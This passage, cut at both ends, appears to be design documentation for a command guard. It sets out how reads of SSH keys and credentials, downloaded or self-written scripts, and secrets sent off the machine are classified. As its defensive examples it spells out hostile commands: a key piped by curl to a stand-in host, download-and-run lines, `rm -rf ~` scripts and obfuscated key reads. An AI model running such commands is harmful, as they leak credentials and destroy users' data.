runs; a `chdir` it cannot place; a call it has no row for that is given a path
(`unknown` with the reason `gives a path to a call the guard does not read`, or
`read_secret` when the path is a key); and code loaded from outside the
workspace: a module from the network (also `run_downloaded`), a file outside it
(an absolute path, a `file:` URL, `../x.js`), a `data:` URL, a `sys.path` entry
outside it, and a `PYTHONPATH` or `NODE_OPTIONS` that loads such code. A key
among them is `read_secret`. A program the code starts with an environment the
code sets is `unknown` with the reason `starts a program with an environment
set in the code`, because the variable may be one the shell side judges. A name
bound by nested code, and a name written with an escape or not in ASCII, is a
name the reader does not follow. Code too long or nested too deeply to read is
`unreadable`. A string worked out from names is cut at 4 KB, and the strings
noted for all names together and the paths read out of them are bounded, so a
few hundred bytes cannot take seconds: a name that went over a limit is dropped,
not read as any string, and a read of it is `unknown`, so no limit makes a line
safe.

## Reading a key

`read_secret` finds a read of a key or a credential. Refused on the file API,
a key can be read through the shell, so the two guards give the same answer
for the same file: `cat <path>` is `read_secret` exactly when the file guard
calls a read of `<path>` one, in the place's own words (`reads your SSH keys`,
`reads the system's password hashes`). `crates/guards/tests/agree.rs` holds
them to it: it takes every path the file guard's case files name, on a POSIX
machine, a Mac and a Windows one, and runs it through `cat` (POSIX),
`Get-Content` (PowerShell) and `type` (cmd).

What is a secret is core's: a place it marks `Secret` (see
[Core](core.md#what-core-judges)), a disk (its bytes hold every key on it,
`reads a disk, and every key on it`), and in a POSIX shell what the kernel
serves, `/proc/self/environ` and `/dev/mem` (`reads the kernel's process
files`, `reads a device file`). Not the repository's history, not a shell
startup file, not a protected path, and not `.env`, which core does not list.

| Line | Rule | Reason |
| --- | --- | --- |
| `cat ~/.ssh/id_ed25519`, `head -c 100 ~/.aws/credentials`, `base64 < ~/.ssh/id_rsa`, `grep key ~/.netrc` | `read_secret` | reads your SSH keys, reads your AWS credentials, reads your saved logins |
| `Get-Content $HOME\.ssh\id_ed25519`, `type %USERPROFILE%\.aws\credentials` | `read_secret` | reads your SSH keys, reads your AWS credentials |
| `sudo cat ~/.ssh/id_ed25519` | `elevated`, `read_secret` | runs as root, reads your SSH keys |
| `cat /etc/shadow`, `cat /proc/self/environ`, `dd if=/dev/sda` | `read_secret` | the place's words |
| `cat .git/config`, `cat ~/.zshrc`, `cat .env`, `cat src/main.rs`, `ls ~/.ssh` | safe | |

### What reads

A line reads a secret when a program the guard knows opens the file's
contents, or a `<` redirect does (with any program, and in cmd too):

- **The operand table of [Reads only](#the-readers).** One table says which
  arguments each reader opens as files, so `effect` and this rule cannot
  disagree about what a line opens: `cat`, `head`, `tail`, `wc`, `less`,
  `sort`, `diff`, `grep`, `egrep`, `fgrep`, `rg` (every operand but the
  pattern, a `-f FILE` too), `git` (what `--no-index`, `blame --contents` and
  the like name, never the folder `-C` names), `Get-Content`, `Select-String`,
  `type`, `findstr`.
- **Programs that are not reads-only but show or pass on what they open**, with
  what their own options take: `more`, `tac`, `nl`, `rev`, `fold`, `paste`,
  `cut`, `uniq`, `comm`, `cmp`, `od`, `xxd`, `hexdump`, `strings`, `base64`,
  `bat`, `awk` and `sed` (after the program), `tar` (every operand but the
  values of `-C` and the like), `gzip` and the other compressors, `zip`, `7z`,
  `gpg`, `openssl` (`-in`, `-inkey`, `-key`), `curl` given a `file://` URL,
  `source`, `dd if=` (`curl file://$HOME/.ssh/id_rsa` too, `$HOME` in it being
  the home directory as in a plain word), PowerShell's `Import-Clixml`, `Import-Csv` and
  `Compress-Archive`, cmd's `more`, `sort`, `find`, `fc` and `certutil`.
- **A copy reads its sources**, whatever it does with them and wherever they
  land: `cp`, `install`, `rsync`, `Copy-Item`, `copy`, `xcopy`, `robocopy`.
  `cp ~/.ssh/id_ed25519 keys/` is a read of the key, and the key now sits
  where it may be committed.
- **A listing piped into a reader.** The stage before a reader hands it
  names, so a stage that lists a folder of keys is a read of them, through any
  stage that only selects or orders: `ls ~/.ssh | xargs cat`, `find ~/.ssh |
  xargs grep key`, `Get-ChildItem ~\.ssh | Get-Content`, and `find ~/.ssh
  -exec cat {} +`. The words of an `echo` or a `printf` are a list too
  (`echo ~/.ssh/id_rsa | xargs cat`, `printf '%s\n' ~/.ssh/id_rsa | xargs cat`,
  PowerShell's `Write-Output`); a word the guard cannot place is no finding.
- **A `for` over words written out** is read with each word in place, as
  `effect` reads it: `for f in ~/.ssh/*; do cat "$f"; done`, also for a `<`
  redirect in the body.
- The wrappers come off, as for every rule (`sudo cat`, `env cat`, `bash -c
  'cat …'`).

A line that only names a file is not a read of it. `ls ~/.ssh`, `stat`, `du`,
`df`, `file`, `realpath`, `test -f`, `find` with no `-exec` and `echo` give
names, sizes and answers about a file, not what is in it, and are safe. A
program that uses a key and does not show it (`ssh -i ~/.ssh/id_ed25519 host`,
`ssh-add`, `git -C ~/.ssh`) is safe too. A program that sends a file off the
machine (`curl -d @key`, `scp`) is not this rule's. This rule reports what a
line reads and a rule of its own, `SendSecret`, reports what leaves, so one
reads and the other sends, and a line can be both: `cat ~/.ssh/id_ed25519 |
curl -d @- https://x.example` is `read_secret` for the `cat`.

### The spelling of the file

The file is judged by what it resolves to, as for every rule: `~`, `$HOME`,
`${HOME}`, `..`, doubled separators, case (on every host), a Windows short
name, a long path, a device path, a Mac's links to the root, another user's
home, all by [core](core.md). The shell's syntax adds:

- A brace list is spelled out first: `cat ~/.ssh/{id_rsa,x}` and
  `cp ~/.ssh/id_{rsa,ed25519} /tmp` read `~/.ssh/id_rsa`; a list that makes
  more than 256 words is read as a file known only when the line runs.
- A POSIX wildcard part that can match `..` (`.*`, `.?`, `.[.]`, `.[!a]`)
  stands for `.` and `..` as well as the names it picks, since bash 3.2 (macOS's
  `/bin/sh`) and dash match them and the guard cannot know which shell runs
  the line: `cat .*/.*/.ssh/id_rsa` from `~/work/repo` reads `~/.ssh/id_rsa`.
  A folder read all the way down is read so too: from `~/work`, `grep -r x .*`
  reads the home directory and its keys, as `grep -r x ..` does. Core does
  this for every rule that resolves a pattern (`Resolver::places` gives each
  reading), so `rm -rf
  .*/.*/.agent` is judged against the parent as well. `cat .*rc` cannot match
  `..` and is not read that way. PowerShell and cmd wildcards are not.
- A wildcard picks what it can match, as for a protected path:
  `cat ~/.s*/id_rsa`, `cat /etc/sh*dow` and `cat /home/*/.ssh/id_rsa` read a
  key. `cat ~/*` does not, in a POSIX shell, since `*` does not match `.ssh`
  (unless the line turns `dotglob` on); `Get-Content ~\*` does, since a
  PowerShell wildcard matches a leading dot. `cat ~/.*` reads every dot file
  in the home directory, which includes `.netrc`.
- `~alice/.ssh/id_rsa` is read as `/home/alice/.ssh/id_rsa` and
  `/Users/alice/.ssh/id_rsa`, and `~root` also as `/root` and `/var/root`.
- A word that only ends in something known when the line runs lands in the
  folder before it: `cat ~/.ssh/$f` and `cat /proc/$$/environ` are reads
  (`$f` could be `../..`: an accepted false alarm).
- A PowerShell word that is a variable and a path (`$HOME\.ssh\id_rsa`,
  `$env:USERPROFILE/.aws`) is read as the expandable string it is. The grammar
  reads it as a member access and loses the path, so the guard puts it in
  double quotes before it reads the line.
- An ANSI-C string is a value known when the line is read, so it is read:
  `cat $'\x2f'home/me/.ssh/id_rsa` and `cat ~/.ssh/$'id_rsa'` read the key. A
  `~` it makes is a plain character, as it is in a quoted word of the
  shell: `cat $'\x7e'/.ssh/id_rsa` names a folder called `~` and is not a
  finding. `$HOME`, `${HOME}`, `$PWD` and `$TMPDIR` in such a word, or in a brace
  list, are the places they name unless the line sets them.
- PowerShell's `. FILE` and `& FILE`, and a file given as the program
  (`. $HOME/.ssh/id_ed25519`), read what is in the file.
- A `<` redirect has the same spellings. `exec 3< ~/.ssh/id_rsa` and
  `x=$(< ~/.ssh/id_rsa)` read the key. In cmd the target is read as cmd reads
  it, with its quotes off: `more < "%USERPROFILE%\.ssh\id_rsa"` is the key.

### A folder read all the way down

A program that goes through every folder below the one it is given holds the
keys in it when it is given the home directory, a folder holding it, or the
root of a disk: `grep -r BEGIN ~`, `rg token ~` (`rg` skips hidden entries by
default, and is read as if it did not), `cp -r ~ /tmp/b`, `rsync -a ~/ /tmp/b/`,
`tar czf x.tgz ~`, `zip -r x.zip ~`, `diff -r ~ x`, `find ~ -type f -exec cat
{} +`, `find ~ | xargs cat`, cmd's `findstr /s` and `xcopy /s`, PowerShell's
`Copy-Item -Recurse` and `Get-ChildItem -Recurse ~ | Get-Content`. A search
given no place is of the working directory (`cd ~ && rg token`), unless a
pipeline gives it text. The reason says it: `reads your home directory, and the
keys in it`. Another folder that holds a key without being one (`~/.config`,
`/etc`) is not told apart from any other.

### What is not a finding

- **A file known only when the line runs.** `cat $f`, `cat "$(pwd)/x"`, `cat
  "$X/.ssh/id_rsa"`, `cat ~/${NAME}`, `Get-Content
  (Join-Path …)`, a PowerShell string with a variable the guard cannot name, a
  path in a variable the line sets (`k=~/.ssh/id_rsa; cat $k`), and a
  .NET read given such a path (`[IO.File]::ReadAllText($p)`). A .NET read of
  a path written out (`[IO.File]::ReadAllText("$HOME\.ssh\id_rsa")`,
  `ReadAllLines`, `ReadAllBytes`, `ReadLines`, `OpenRead`, `OpenText`) is read
  as a `Get-Content` of it. The guard does not guess a value,
  and `classify` flags nothing for it. `effect` already says `Unknown` for each
  (a path known only when it runs is not reads-only), so a caller that only lets
  a line run unasked when it is `ReadsOnly` asks. A reader whose file is known
  and is not a secret is safe, with its own row.
- **A program the guard does not know opens a file.** `jq`, `yq`, `ssh-keygen
  -y -f`, an editor, `column`. The list above is what is known; a program
  outside it is `effect`'s `Unknown`, and a script file is the workspace's own
  code and not read.
- **Inline code that opens a file is a read of it.** Python and JavaScript
  given inline are read (see [Inline code](#inline-code)), and an `open()` in a
  mode that reads, `Path.read_text` and `read_bytes`, `readFileSync`,
  `readFile`, `fs.promises.readFile`, `createReadStream`, `openSync`,
  `Deno.readTextFile`, and the source of `shutil.copy*`, `copytree` and
  `copyFileSync` are judged as `cat <path>` is: `read_secret` exactly when
  the path is a place core marks `Secret`, with the same words. Only a path
  the code gives whole is a path the guard knows: a literal,
  `os.path.expanduser('~/…')`, `Path.home() / …`, `os.homedir() + …`, an
  f-string or template literal made of those, or a name the code sets to one
  of those, or to strings a loop goes over when they are written out (every
  string a name is set to anywhere in the code is read, in any order, up to
  the limits below). A read of any other path fails closed, as a delete of one
  is a place unknown for `rm`: the line is `unknown`, with the reason `opens a
  file whose path is only known when the code runs` and the path as the
  target, unless the part of it the code does give already lies in a place
  that holds a key, which is `read_secret`, as `cat ~/.ssh/$n` is. So a path
  that starts in a key folder and ends in something only known when the code
  runs is `read_secret` (`'/home/me/.ssh/' + n`, `f'…/{n}'`, `'…/%s' % n`
  and `'…/{}'.format(n)`, when the folder comes before the first part that is
  not a literal, `os.path.join(d, n)`, `Path(d) / n`, `d.joinpath(n)`,
  `` `…/${n}` ``, `path.join(d, n)`, `.concat(n)` and `[d, n].join('/')`), and
  every other path not given whole is `unknown`: one with nothing known before
  the part that is not (`open(n + '/x')`), one in a folder that holds no key
  (`open('/etc/' + n)`, `open('src/' + n)`), the home directory with a name
  after it (`~/` and each name `os.listdir` gives, dotfiles among them), a
  path only known when the code runs (`open(sys.argv[1])`, `open(input())`,
  `fileinput.input()` given no files, which reads the ones the line names), a
  string made by a call the reader does not follow (`'…'.strip()`, `[:-1]`,
  `.lower()`, `base64.b64decode(…)`, `chr(47)`, `atob(…)`, `new URL(…)`, a
  function or a lambda that returns it), a name it does not follow (a
  subscript, a dict, an unpacking, an object's member, a walrus), a `%` or a
  `.format` with a part that is not a literal (`'%s/.ssh/id_rsa' % h`, even
  when `h` is the home directory), and a name a loop sets to each path a
  listing gives, whose pattern is not followed (`Path('~').glob('.ssh/*')`,
  `Path.home().rglob('id_rsa')`, `glob.glob('~/.n*')`, `iterdir`, `listdir`,
  `os.walk`, `os.scandir`, `readdirSync`), and a name a loop sets to each of
  anything but a list written out where the loop is (`for k in ks` with `ks`
  a name set to a list, a dict's `values()` or `items()`, `'a b'.split()`, a
  concatenation of lists, `enumerate(…)`, `Object.keys(…).forEach`). Code the
  guard cannot read, a program the code starts and a name it does not follow
  stay `unknown` as above.

  A name that holds more than one string, used in a longer path (`for d in
  ['a', '/home/me/.ssh']: open(d + '/id_rsa')`), makes one read for each
  choice of a string for each such name, as the shell reads a `for` over words
  written out: up to 256 choices for one path, and 65,536 for a piece of code.

  A name is put back as its strings only as far as the reader holds them: a
  string worked out from names is cut at 4 KB, the strings of all names
  together at a few times the length limit, and the paths read out of names at
  1,024 for a piece of code (there is no count per name: 65 strings with the
  key last are all read). A name that went over one of them is dropped, and a
  read of it is `unknown`, never a read of nothing. So is a name grown in place
  (`k += '…'`).

  A name is put back as its strings only when the reader works out every
  binding of it whole. A binding is an assignment, an augmented assignment, a
  walrus, an unpacking target (`x, y = …`, `[x, *y] = …`, `({x} = …)`), a `for`,
  `with`, `except`, `match` or `catch` target, a parameter, a `def`, a `class`,
  a `global` or `nonlocal` write from a function, a `del`, a `var` declared
  again, an increment, a property of the global object, and a write from code
  that `exec` or `eval` runs, at any depth. One that is not a string the reader
  gives whole (`x = sys.argv[1]`, `x = chr(47) + '…'`, `x = '…'[::-1]`,
  `x = y[0]`, `x = g()`, `x = KEY if c else 'b'`, `x = '%s/…' % h`, any of the
  forms above) makes a read of the name `unknown` besides the strings it was
  set to whole, which are read as before: `read_secret` when one is a key, so
  `x = '/home/me/.ssh/id_rsa'` followed by `x = sys.argv[1]` is a read of the
  key, and `x = 'a.txt'` followed by it is `unknown`. A path worked out from
  such a name is `unknown` as well, whatever the order the code writes them in.
  A name that is only ever set in any other way (a parameter, an unpacking) is
  a path only known when the code runs.
- **A program that reads a secret without being given its path**: `gpg
  --export-secret-keys`, `security find-generic-password -w`, `printenv`.
- **What leaves the machine** is `SendSecret`'s, as above: `curl -d @key` and
  `scp key host:` upload a file, and are not read here.

### Accepted false alarms

A false alarm asks once more; a miss lets a key out. Each is a test row:

- A place is a secret by what it is under, not by which file: `cat
  ~/.ssh/id_ed25519.pub`, `cat ~/.ssh/known_hosts`, `cat ~/.ssh/config` and
  `cp ~/.ssh/id_ed25519.pub keys/` are `read_secret`, as they are for the file
  guard. (`cp ~/.ssh/id_ed25519.pub keys/` was a safe row before this rule.)
- A `<` redirect is a read whatever the program makes of it: `wc -l <
  ~/.ssh/known_hosts` is, as `wc -l ~/.ssh/known_hosts` is. `wc` counts, and is
  read like the rest because the redirect cannot tell it apart.
- `~/.ssh/$f` when `$f` climbs out of the folder, `grep -r x ~` when what it
  finds is not a key, `rg x ~` (which skips hidden entries), `git log --
  ~/.ssh/x` (git refuses a path outside the work tree), `tar cf ~/.ssh/x.tar
  src` (the archive is named under `.ssh`), and the pattern of a search that is
  spelled like a key's path.

### Why `effect` still says ReadsOnly

The rule is a finding about the file, not about what the line does to the
machine, so it joins `Elevated` in the findings that leave a line `ReadsOnly`
(see [Reads only](#reads-only)). The other choice, to make a read of a key not
reads-only, would turn `effect` into a second policy about keys, which the
caller already has from `classify`. A caller that runs a line unasked only when
`effect` is `ReadsOnly` must read `classify` too, and it already does to catch
`Elevated`.

## What cannot be read is risky

A line is never safe because the guard gave up on it. These come back risky:

- A program or script known only when it runs: `$CMD`, `eval "$x"`, `trap "$x" EXIT`, `iex $s`,
  `-EncodedCommand`.
- Code handed to an interpreter that is not read: Ruby, Perl (beyond
  `perl -pi`), PHP and Lua, and any code piped into an interpreter, or read
  from a file it is redirected from. Python and JavaScript given inline
  (`python3 -c`, `node -e`, `bun -e`, `deno eval`) are read, and what they do
  is judged, but a line is safe only for code read whole: written whole on the
  line, with no option or environment around the interpreter, and made of
  plain statements and calls on a short list. Any other code is `unknown`,
  `runs code the guard does not read fully`, unless it is found to do
  something worse (see [Inline code](#inline-code)).
- A .NET call that deletes, writes or starts a program.
- PowerShell code known only when it runs: a script block that is not written
  out where a cmdlet takes it (`Invoke-Command $b`, `-ScriptBlock $b`, `Start-Job`,
  `Start-ThreadJob`, `Register-ScheduledJob`, `Set-PSBreakpoint -Action`,
  `-Process`/`-Begin`/`-End`/`-RemainingScripts` and the first block of
  `ForEach-Object`, `Where-Object -FilterScript`, `New-Module`,
  `Measure-Command`, `Trace-Command -Expression`), a hook set on `$ExecutionContext.InvokeCommand` (by
  assignment or its `set_` method, `LocationChangedAction` among them), and code built
  from text (`[scriptblock]::Create(…)`, `NewScriptBlock`, `InvokeScript`,
  `ExpandString`, whose `$( )` subexpressions run). A block
  written out is read where it stands, and so is a string written out as the
  text of the code; a method name quoted (`.'InvokeScript'(…)`) is the same
  method. A method called by a name only known when it runs
  (`.$m('…')`, `.($m)('…')`, `."Invoke$x"('…')`) may be any method, `InvokeScript`
  and `Delete` among them, so it is risky; a property read (`$row.$col`) has no
  call and is not. `Where-Object Name -eq x` takes a word first as the property
  of the comparison, so only another first argument that is not a block
  written out (`? $b`, `Where-Object $prop -eq 1`) is risky, as is
  `Trace-Command`'s second argument (`Trace-Command Name $b`) or its `-Command`.
  `ForEach-Object Name` takes a member name, not a block, and what
  follows it is the member's arguments (`$list | % Add $item` is safe), but a
  member name is judged as the call written out is: a method that is
  risky as `.Invoke()` and `.Delete()` are (`% Invoke`, `-MemberName Delete`),
  `InvokeScript`, `NewScriptBlock` and `ExpandString` (their text is read when
  written out, positionally or after `-ArgumentList`), and a hook set by
  `set_` or by its property given an argument. `Start-Job` takes
  `-InitializationScript` by position after the block, so `Start-Job { … } $init` is risky, and a named
  `-InitializationScript` on `Start-ThreadJob` or `Register-ScheduledJob` does not
  make a block given by position safe. A splat (`@p`) on these cmdlets may hold a
  block, so it is risky unless the cmdlet runs one block only and one is written
  out. A comma list stays with the parameter it follows (`-ArgumentList $x, $y`),
  and so does the argument after a parameter written with a colon
  (`-Confirm:$false`), a common parameter (`-ErrorAction Stop`) and `-Args`.
- A PowerShell word that may be a redirect and cannot be told apart: a `>`
  with no file after it (`echo x 1>`), two in one word (`a>b>c`), a `>` in a
  word that also holds a quote or an escape (`1>"..\x.txt"`, `` 1>x`.txt ``),
  or one in the name of the command (`echo>f`, `& echo>f`). It is `unknown`,
  `has a word that may be a redirect the guard cannot read`. A `>` inside a
  closed quote of a word is read as text (`--format="%an <%ae>"`), unless a
  double-quoted span holds `$(` or a backtick (`--format="$(echo a>f)"`).
- A database statement known only when it runs: `psql -c "$Q"`.
- A path built at run time or by a brace list.
- A value only known when it runs where bash reads a value again as code:
  arithmetic, `${!x}` and `${x@P}` (see
  [Values read again as code](#values-read-again-as-code)).
- A program named by a brace list or a wildcard (`command {rm,-rf,~}`, `./*
  -rf /`).
- A loop, a conditional or a `{` stuck to a word after `time`, `!`, `coproc`
  or zsh's `repeat` (`time for …; do …; done`, `! {rm -rf ~;}`), and words
  after the file of a redirect on a group, a loop or a subshell (`{ ls; } >
  out rm -rf ~`), which the grammar cuts up.
- A line the grammar cannot parse.
- Shells nested past a limit, a parse tree nested too deep, or a line longer
  than the limit.

`unknown` is for a program or a script. `unreadable` is for a line the guard
could not read.

## Reading more than one unit at a time

Some risks only show when units are read together.

- **Links.** A link judges its target too. `ln ~/.zshrc z` is risky, since a
  later write to `z` lands on the startup file.
- **A script a line writes and then runs.** It is risky however it was
  written: a redirect, a download (`curl -o`, `curl -O`, `wget`), a copy or
  `tee`. `curl -fsSLo i.sh URL && sh i.sh` is `unknown` ("runs a script the
  same line writes"; `run_downloaded` is a download piped into a shell). The
  guard matches the two by the file they name (core's `key`).
  When the line writes a file (a device such as `/dev/null` does not count),
  a script whose path cannot be placed (after a `cd` to somewhere unknown, or
  `bash C:x` after a `cd`) is `unknown`, since it may be the one the line wrote.
  A line that writes nothing has no such script.
  A run is judged from every folder the line may be in when it runs: a `cd`
  that may not have run (in a branch, after `&&` or `||` or on the left of
  `||`, in a loop or a function body, in a pipeline stage of a POSIX shell or
  cmd, or behind a wrapper; not in an `if true` body, nor in a PowerShell
  pipeline, whose stages run in the line's own session) may leave the line
  where it was, and a `cd` on the right side of `&&` or `||` runs only when
  the left let it, so the line may also be where that list began. Each later
  `cd` moves every one of those folders on. So `echo x > x.sh; false && cd s;
  bash x.sh`, `echo x > x.sh; [ -d s ] && cd s; bash x.sh`, `echo x > x.sh; cd
  a && cd s; bash x.sh` and `echo x > x.sh; cd a; false && cd s; bash ../x.sh`
  may run the file they wrote and are `unknown`, while `echo x > log.txt; test
  -d sub && cd sub; ./app` runs no file it wrote from any of them and stays
  safe. A list of `&&` stops at its first failing command, so it may only end
  where it began or where one of its `cd`s took the line, one folder more
  than it has `cd`s, and a command later in the same list runs only when
  every `cd` before it did, so it is in one folder: the folders the list may
  have stopped in count for the commands after the list, and are not moved
  on by the list's own later `cd`s. `cd a && make > log && cd ../b && make >
  log && cd .. && ./run` and `echo x > log; cd a && cd b && cd c && cd d;
  ./app` stay safe, while `echo x > x.sh; cd a && cd b && cd c && cd d; bash
  ../../x.sh` (the list stopped after `cd b`) is `unknown`. An `||` lets its
  right side run where the list may have stopped, and lets a command after
  it run where the left of it left the line, so from an `||` on those
  folders count for the rest of the list too. A redirect on the last command
  of a list keeps it one list (`cd a && make > log && cd ../b` is still one
  list of `&&`, and so is `cd a && make 2>&1 | tee log && cd ../b`, where only
  `make` is in the pipeline), so `cd a && make > log && cd ../b && make > log
  && cd ../c && make > log && cd ../d && make > log && cd .. && ./run` stays
  safe. A file written where the line may already be in more than one folder
  (after a `cd` that may not have run) is placed only from where the walk has
  the line, and a later `cd` may bring the folders together again, so the
  guard does not follow which file each folder holds: a later run of a script
  of that file's name, in any folder, is `unknown`. `false && cd s; echo x >
  x.sh; cd /home/me/work/repo; bash x.sh` runs the file it wrote when `cd s`
  did not run; `false && cd s; echo x > x.sh; cd s; bash x.sh` does not, but
  is `unknown` all the same, while `test -d build && cd build; make >
  build.log; ./app` runs no file of a name it wrote and stays safe. Past
  eight such folders the line may be anywhere, and a run of a script by a
  relative path is `unknown` once the line writes any file.
  A plain `cd` may fail too: a folder that is not there is an error, and
  POSIX shells, cmd and PowerShell (whose `cd` error does not stop the line,
  whatever `-ErrorAction` says, since a `try` or a `trap` may go on past it)
  run the next command where the line was. So for a run of a file only, a
  plain `cd` (`cd`, `pushd`, `Set-Location`, an `if true` body's, one before
  `&&`), read after the line wrote a file, also leaves the line in every
  folder it may have been in before it, each moved on by every later `cd`:
  `echo x > x.sh; cd s; bash x.sh`, `echo x > x.bat & cd s & x.bat` and
  `'x' > x.ps1; Set-Location s; .\x.ps1` may run the file they wrote and are
  `unknown`. Nothing else takes the `cd` as one that may have failed: where
  paths are placed, where a redirect opens and every other check go on from
  where it moved the line, and a file written after it is placed from there
  alone. A command on the right side of the `&&` after it runs only when it
  ran, so the folders it may have stayed in count only after the list (or
  from an `||` on): `echo x > x.sh; cd s && bash x.sh` stays safe, `echo x >
  x.sh; cd s && make; bash x.sh` is `unknown`. Before the line writes a file
  there is nothing to run where it stayed, so `cd build; make; ./app` and
  `cd s; bash x.sh` stay safe, and a `cd` that only steps up (`cd ..`,
  `cd ../..`, cmd's `cd..`) goes back through folders the shell came through
  and is taken as run, so `cd sub; echo x > x.sh; cd ..; ./x.sh` stays safe.
  Past eight such folders (a chain of `cd`s into folders, each of which may
  have failed) each file written so far counts as written in every folder by
  its name, as above: a run of a script of that name is `unknown`, and one of
  another name (`echo x > log; cd a; cd b; cd c; cd d; cd e; cd f; ./app`)
  stays safe.
  An `||` whose right side ends the shell is the exception: in `cd s ||
  exit` the rest of the line runs only when the left side did not fail, so
  the `cd` ran, and so did every `cd` on the right of an `&&` before the
  `||` (`cd a && cd b || exit`). After the list the line is only where the
  left side took it, for a run of a file and for every other check (where
  paths are placed, where a redirect opens): `echo x > x.sh; cd s || exit;
  bash x.sh` and `cd a || exit; make > log; cd ../b || exit; make > log; cd
  ../c || exit; make > log; cd ../d || exit; ./build.sh` stay safe, while
  `echo x > x.sh; cd s || exit; bash ../x.sh` is `unknown`. The right side
  itself still runs where the failed `cd` left the line (`echo x > x.sh; cd
  s || { bash x.sh; exit; }` is `unknown`). A right side ends the shell when
  it is the builtin `exit`, alone or last in a `{ …; }` group (in cmd,
  `exit`, `exit /b`, alone or last in a `( … )` block, which runs in cmd
  itself). Nothing else does: `true`; `return`, which bash goes on past
  outside a function (inside one, its `cd` is already one that may not have
  run); an `exit` with a redirect of its own, before or after its name
  (`<nofile exit`, `exit <<< x`, `exit 2> /dev/null`: the grammar puts the
  last on the whole list), which does not run when the redirect fails; one
  with more than one argument, or one that may expand to more (`exit 1 2`,
  `exit *`, `exit "$@"`), which zsh goes on past; one in a subshell, a
  pipeline or the background, which ends only that process; one after the
  line defines a function of that name, or uses `alias`, `enable` or
  `disable`; cmd's `exit /?`, or any argument with `/?` in it (`exit /b/?`),
  which prints its help; and PowerShell's `exit`, which its grammar reads
  after `||` as a command. Nor is a left side that may succeed when its `cd`
  failed taken as one whose `cd` ran: one with a `!` anywhere in it (`! cd s
  || exit`, `{ ! cd s; } || exit`, `cd a && ! cd b || exit`), and any left
  side once the line defines a function named `cd`, `chdir`, `pushd` or
  `popd` (`cd() { :; }; cd s || exit`), which may return 0 without moving
  the line. An `||` before it in the same list still counts (`true || cd s
  || exit; bash x.sh` runs where the line began when `true` succeeds), and so
  does a left side that ends in `|| true`.
  The file may be run as the program itself, not only handed to a shell: a
  program named by a path (`./x.sh`, `x/run`, `/tmp/x`, `~/x.sh`) is that
  file, so `echo 'rm -rf ~' > x.sh; ./x.sh` and `curl -o run URL; chmod +x
  run; ./run` are `unknown` with the same reason, however the program is
  wrapped (`sudo`, `env`, `nohup`, `xargs`, `find -exec`, `bash -c`) or when it
  runs (a trap whose action runs `./x.sh` before the line writes it). A bare
  name (`x.sh`) is looked up in `PATH`, not in the folder, so it is not the
  file; `./gradlew build` with nothing written first stays safe. On Windows
  file names are not case sensitive and a name with no extension runs the file
  with `.bat`, `.cmd`, `.com` or `.exe` (`a` runs `a.bat`), and PowerShell
  tries `.ps1` first (`.\a` runs `a.ps1`); cmd looks in the
  working folder first, so a bare name there is the file the line writes when
  it names one (it is not judged when it cannot be placed: `dir` and `echo`
  are programs of cmd, not files).
  PowerShell runs a script file by name too, so these are `unknown` with the
  same reason when the line writes the file: `powershell` or `pwsh -File
  i.ps1` (`-f`, `-fi`, `/File`, `-File:i.ps1`, after any other option; a name
  with no extension is the `.ps1` PowerShell tries first), the first word that
  is not a parameter (`pwsh i.ps1` runs it as a file), and `Invoke-Command
  -FilePath i.ps1`. `powershell -File scripts\build.ps1` with nothing written
  first stays safe. After `-WorkingDirectory` the file is read from a folder
  the line gives, so it counts as only known when it runs: `unknown` once the
  line writes any file. `pwsh -File i.ps1` from a POSIX shell is read the same
  way.
  A PowerShell write names its file by position as well as by `-Path`,
  `-LiteralPath` or `-FilePath`: `Set-Content i.ps1 x`, `Add-Content`,
  `'x' | Out-File i.ps1`, `Tee-Object`, `New-Item i.ps1 -Value x` (with
  `-Name`, the name inside the folder), and the aliases, and the destination
  of `Copy-Item a b` and `Move-Item a b`. Each is a write of that file, so
  `Set-Content i.ps1 x; .\i.ps1` is `unknown` as the `-Path` form is. The
  parser hands a list of paths (`a.ps1,b.ps1`) over as separate words, which
  cannot be told from a file and its value, so every other operand the guard
  can read counts as a file too (`Set-Content notes.txt x.ps1; .\x.ps1` is
  `unknown`), and so does every operand when a parameter the guard cannot tell
  takes a value or not may have taken the first. A write by a pattern
  (`Set-Content *.ps1 x`, `tee *.sh`) writes every file it matches: a run of a
  file in the same folder whose name matches is `unknown`, one in another
  folder is not. The work for each run is bounded: the guard reads up to
  eight distinct patterns, each with a file name part of up to 64 bytes (the
  same pattern again adds nothing). A line that writes by more, or by a longer
  one, writes any file, so every script it runs is `unknown`; so is the run
  of a name longer than 255 bytes when the line writes by any pattern. A file
  named by something only known when it runs is a write the guard cannot
  place: a write cmdlet's path or name that is one (`Set-Content $f x`,
  `Set-Content a.txt,$x y`, `New-Item -Path a.txt,$x`), first or later in a
  list, writes any file, so every script the line runs is `unknown`. The
  word after the first path is not told from the value, so `Set-Content
  notes.txt $x; .\i.ps1` is `unknown` too; a value given by `-Value` is not a
  path. A `New-Item` of more than 64 paths and names together is read the
  same way.
- **A listing piped into a delete.** It hands on what it picks. `ls *.bak |
  xargs rm` and `Get-ChildItem *.log | Remove-Item` delete files in the
  workspace. A whole folder listed (`ls | xargs rm -rf`) is as much as the
  folder. A listed pattern is judged as the delete of that pattern is, `..`
  and all: `ls -d src/*/../../.g* | xargs rm -rf` is risky.
- **`find`.** It acts on the folder it searches when its name filter can match
  `.git`, or when it negates or alternates its filters (`!`, `-not`, `-o`).
- **Git config that makes git run a command.** `-c alias.x=!...`,
  `core.pager`, `core.sshCommand`, and `git config` setting them. Reading
  them is fine.
- **In-place edits.** `perl -pi -e` is an edit like `sed -i`, judged by the
  files it edits, when its code is only substitutions (`s/a/b/g`, `tr/.../.../`)
  that run nothing. An `/e` flag, `@{[...]}`, backticks or any other code make
  it risky.

## Secrets that leave the machine

`send_secret` is for a secret sent to another machine. Reading one here is not
this rule: `cat ~/.ssh/config` is [`read_secret`](#reading-a-key). Sending a
file that is not one is safe (`scp build/pkg.tar host:/srv/`,
`curl -d @payload.json https://api.example`).

**What is a secret.**

- A path core marks as holding a key or a credential: `~/.ssh`, `~/.aws`,
  `~/.gnupg`, the keychains and the rest of its table of secrets. Shell
  startup files and the repository's history are sensitive in core too, but
  they hold no secret, so sending one is not this rule. A public key
  (`id_ed25519.pub`) is not one either.
- An `.env` file anywhere, in the workspace too: `.env`, `.env.*` and a name
  that ends in `.env` (`prod.env`), not a folder, not a template
  (`.env.example`, `.sample`, `.template`, `.dist`, `example.env`), and not an
  encrypted copy (`.env.gpg`, `.pgp`, `.age`, `.enc`, `.vault`), which is made
  to be committed or sent. An `.envrc` too, and a shell's or a prompt's
